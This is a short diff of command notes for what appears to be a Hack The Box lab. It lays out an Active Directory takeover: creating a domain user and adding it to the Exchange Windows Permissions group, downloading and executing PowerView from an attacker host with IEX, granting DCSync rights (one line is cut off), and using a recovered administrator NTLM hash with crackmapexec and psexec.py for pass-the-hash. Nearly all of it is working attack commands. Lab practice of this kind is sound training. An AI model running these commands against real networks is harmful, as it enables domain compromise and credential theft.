@@ -41,5 +41,15 @@ net user cman CaveFormation /add /domain
 net group "Exchange Windows Permissions"
 
 net group "Exchange Windows Permissions" /add cman
-
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerView.ps1')
+$pass = convertto-securestring 'CaveFormation' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('HTB\cman', $pass)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity >
+
+32693b11e6aa90eb43d32c72a07ceea6
+
+crackmapexec smb 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+
+python3 psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+
+
